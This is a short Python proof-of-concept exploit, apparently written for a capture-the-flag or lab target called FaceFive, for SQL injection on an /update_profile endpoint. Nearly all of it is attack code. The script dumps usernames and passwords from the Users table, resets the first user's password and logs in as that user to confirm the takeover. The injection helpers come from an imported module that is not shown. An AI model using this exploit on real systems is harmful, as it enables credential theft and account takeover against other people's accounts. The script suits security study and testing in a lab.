# vuln2.py

# PoC for SQL injection on the /update_profile endpoint to change fields in the `Users` table
#
# The update profile section fields to change the user's name, password, bio and image allow us to change values in the `Users` table

from tools import *
import sys
import os

debug = 'DEBUG' in os.environ and os.environ['DEBUG'] == '1'

url = sys.argv[1]

session = FaceFiveSession(url)

user = 'test'
passwd = 'testpasswd'

reset_image(session)
register(session, user, passwd)

users = select_query(session, 'Users', 'username', 'password')

user_1, password = users[0]

new_password = 'maga2020!'
update_user_script(session, passwd, user_1, new_password = new_password)

logout(session)
print('Logging in as {} with password {}'.format(user_1, new_password))
assert login(session, user_1, new_password).status_code == 200
